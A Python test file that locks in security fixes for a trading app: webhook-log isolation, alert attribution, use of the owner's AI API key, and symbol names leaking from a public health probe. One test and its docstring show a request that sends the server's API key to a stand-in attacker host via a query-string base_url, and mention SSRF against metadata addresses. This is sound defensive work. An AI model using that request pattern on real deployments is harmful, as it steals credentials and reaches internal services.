"""Leaks found by audit, each one closed and kept closed.

The owner asked to be certain their data is theirs alone. Cross-user isolation
of the ORDINARY resources is covered empirically in test_no_cross_user_access.py
and it holds. These are the places where it did not, found by reading every
route rather than by testing the obvious ones -- and every one of them was
written deliberately, with a comment explaining why it was safe, on the
assumption that a deployment has exactly one account.

That assumption is now enforced (test_registration_closes_itself.py), which
makes these unlikely rather than impossible: a second account can still arrive
through scripts/create_user.py, or already exist on a deployment where
ALLOW_REGISTRATION was left switched on before that fix landed. 「Unlikely」 is
not the standard the owner asked for.

One of them needs no second account at all: /healthz is public by necessity --
render.yaml points its health check at it -- and it names the symbols this
deployment watches as soon as one goes stale. That is the owner's watchlist,
served to the internet, at exactly the moment something is wrong.
"""

import pytest

from app.core.security import create_access_token, hash_password
from app.models.user import User


@pytest.fixture
def intruder(auth_client, db_session):
    user = User(email="second@example.com", hashed_password=hash_password("another password"))
    db_session.add(user)
    db_session.commit()
    db_session.refresh(user)
    token = create_access_token(subject=str(user.id), token_version=user.token_version)
    return {"Authorization": f"Bearer {token}"}


# --- the TradingView audit log ------------------------------------------------------


def test_the_webhook_log_does_not_show_one_account_anothers_alerts(
    auth_client, intruder, db_session
):
    """The endpoint was deliberately unfiltered, with a comment: rows that
    failed the shared secret have no user attached, and those are exactly the
    ones somebody debugging needs. True -- but it returned attributed rows too,
    so a second account could read every alert the owner ever received:
    symbols, strategy names, payloads.

    The fix keeps the useful half: unattributed rows are deployment-level
    diagnostics and belong to nobody, so everyone still sees them.
    """
    from app.models.webhook import TradingViewWebhookLog

    owner = db_session.query(User).order_by(User.id).first()
    db_session.add(
        TradingViewWebhookLog(
            user_id=owner.id,
            raw_body='{"symbol": "2330.TW", "action": "buy"}',
            signature_valid=True,
            parsed_ok=True,
        )
    )
    db_session.commit()

    body = auth_client.get("/api/webhooks/tradingview/logs", headers=intruder).json()

    assert all("2330.TW" not in row["raw_body"] for row in body), body


def test_but_a_call_that_failed_the_secret_is_still_visible_to_everyone(
    auth_client, intruder, db_session
):
    """Belongs to nobody, and is the row the endpoint exists for."""
    from app.models.webhook import TradingViewWebhookLog

    db_session.add(
        TradingViewWebhookLog(
            user_id=None,
            raw_body='{"note": "nobody owns this"}',
            signature_valid=True,
            parsed_ok=False,
            error="no strategy matched",
        )
    )
    db_session.commit()

    body = auth_client.get("/api/webhooks/tradingview/logs", headers=intruder).json()

    assert any(row["error"] == "no strategy matched" for row in body), body


def test_the_owner_still_sees_their_own_rows(auth_client, db_session):
    from app.models.webhook import TradingViewWebhookLog

    owner = db_session.query(User).order_by(User.id).first()
    db_session.add(
        TradingViewWebhookLog(
            user_id=owner.id,
            raw_body='{"symbol": "2330.TW"}',
            signature_valid=True,
            parsed_ok=True,
        )
    )
    db_session.commit()

    body = auth_client.get("/api/webhooks/tradingview/logs").json()

    assert any("2330.TW" in row["raw_body"] for row in body), body


# --- who an inbound alert belongs to -------------------------------------------------


def test_an_unattributable_alert_is_not_quietly_given_to_the_lowest_id_account(
    auth_client, db_session
):
    """_resolve_user fell back to `db.query(User).order_by(User.id).first()` --
    the first account ever created, which is the owner. With a second account
    on the deployment, anybody holding the shared TV_WEBHOOK_SECRET could post
    an alert for a symbol nobody owns and have it land in the OWNER'S account,
    creating an order and a notification there.

    With one account that fallback is simply 「the owner」 and is correct. With
    two it is a guess, and this app does not guess about whose money moves.
    """
    from app.api.routers.webhooks import _resolve_user

    db_session.add(User(email="second@example.com", hashed_password=hash_password("x" * 12)))
    db_session.commit()

    assert _resolve_user(db_session, "NOBODY-OWNS-THIS", None) is None


def test_with_a_single_owner_the_fallback_still_works(auth_client, db_session):
    """The single-owner deployment is the normal case and must not regress:
    an alert for a symbol with no matching strategy still reaches the one
    account there is."""
    from app.api.routers.webhooks import _resolve_user

    assert db_session.query(User).count() == 1

    assert _resolve_user(db_session, "NOBODY-OWNS-THIS", None) is not None


# --- the AI key the owner pays for ----------------------------------------------------


def test_a_second_account_does_not_get_to_spend_the_owners_env_api_key(
    auth_client, db_session, monkeypatch
):
    """ai_settings.resolve() falls back to settings.AI_API_KEY when the caller
    has no row of their own. That environment variable was put there by
    whoever deployed this -- the owner -- and it is billed to them.

    The fallback is right for the owner and wrong for anybody else.
    """
    from app.services import ai_settings

    monkeypatch.setattr("app.config.settings.AI_API_KEY", "sk-the-owners-own-key")
    second = User(email="second@example.com", hashed_password=hash_password("x" * 12))
    db_session.add(second)
    db_session.commit()
    db_session.refresh(second)

    resolved = ai_settings.resolve(db_session, second.id)

    assert resolved.api_key != "sk-the-owners-own-key"


def test_the_owner_still_gets_their_own_env_key(auth_client, db_session, monkeypatch):
    from app.services import ai_settings

    monkeypatch.setattr("app.config.settings.AI_API_KEY", "sk-the-owners-own-key")
    owner = db_session.query(User).order_by(User.id).first()

    assert ai_settings.resolve(db_session, owner.id).api_key == "sk-the-owners-own-key"


# --- the model list, which used to post the key wherever it was told ------------------


def test_the_api_key_is_not_sent_to_a_url_supplied_in_the_query(auth_client, monkeypatch):
    """THE WORST ONE FOUND. /api/ai-settings/models takes base_url from the
    QUERY STRING and hands the resolved key to whatever is there:

        GET /api/ai-settings/models?base_url=https://attacker.example/v1

    and the server posts the owner's API key to the attacker. It is also a
    server-side request forgery -- the same parameter will point the backend at
    a cloud metadata address or at localhost.

    The listing itself must keep working from an empty form, because that is
    what makes the picker usable before anything is saved -- OpenRouter's list
    needs no credentials at all. So the key is withheld, not the feature.
    """
    seen: dict = {}

    def _spy(provider, base_url, api_key):
        seen["base_url"] = base_url
        seen["api_key"] = api_key
        from app.services.ai_model_list import ModelList

        return ModelList(models=[], error=None)

    monkeypatch.setattr("app.services.ai_model_list.fetch", _spy)
    monkeypatch.setattr("app.config.settings.AI_API_KEY", "sk-the-owners-own-key")

    auth_client.get("/api/ai-settings/models?base_url=https://attacker.example/v1")

    assert seen.get("api_key") in (None, ""), "the key was sent to a caller-supplied URL"


def test_the_key_is_still_used_for_the_url_the_owner_saved(auth_client, monkeypatch):
    """Withholding it always would break the case the endpoint exists for:
    listing the models your own configured provider offers."""
    seen: dict = {}

    def _spy(provider, base_url, api_key):
        seen["api_key"] = api_key
        from app.services.ai_model_list import ModelList

        return ModelList(models=[], error=None)

    monkeypatch.setattr("app.services.ai_model_list.fetch", _spy)
    saved = auth_client.put(
        "/api/ai-settings",
        json={
            "provider": "anthropic",
            "base_url": "https://api.anthropic.com",
            "model": "claude-opus-5",
            "api_key": "sk-mine",
        },
    )
    assert saved.status_code in (200, 201), saved.text

    auth_client.get("/api/ai-settings/models?base_url=https://api.anthropic.com")

    assert seen.get("api_key") == "sk-mine"


# --- the status page and the public probe ----------------------------------------------


def _healthz_with_gaps(client, monkeypatch, gaps: dict[str, float]):
    """The endpoint in the state a live deployment reaches when a symbol stops
    pricing. Same technique as tests/test_healthz_sees_a_dead_symbol.py."""
    from app.config import settings
    from app.services import worker_health

    class _Beat:
        @staticmethod
        def snapshot():
            return worker_health.HeartbeatSnapshot(
                uptime_sec=9999.0,
                last_loop_age_sec=1.0,
                last_poll_age_sec=1.0,
                consecutive_empty_polls=0,
                symbol_gap_sec=gaps,
            )

    monkeypatch.setattr(settings, "WORKER_ENABLED", True)
    monkeypatch.setattr(settings, "NOTIFICATIONS_ENABLED", True)
    monkeypatch.setattr(worker_health, "heartbeat", _Beat())
    return client.get("/healthz")


def test_the_public_health_probe_does_not_name_the_symbols_this_deployment_watches(
    client, monkeypatch
):
    """/healthz is public by necessity -- render.yaml points its health check
    at it, and the external watchdog polls it every 15 minutes with no
    credentials. It named every stale symbol in the response, so the owner's
    watchlist reached the internet at exactly the moment something went wrong.

    A COUNT says the same thing to a probe. The names belong on the
    authenticated status page.
    """
    body = _healthz_with_gaps(client, monkeypatch, {"2330.TW": 9999.0, "0050.TW": 9999.0}).text

    assert "2330.TW" not in body
    assert "0050.TW" not in body


def test_but_the_probe_still_says_that_something_is_stale(client, monkeypatch):
    """Hiding the names must not hide the fault -- 「警告不能停擺」 depends on
    this probe being able to fail."""
    body = _healthz_with_gaps(client, monkeypatch, {"2330.TW": 9999.0}).json()

    assert body["checks"]["symbols"]["status"] != "ok"
    assert body["checks"]["symbols"].get("stale_count", 0) >= 1
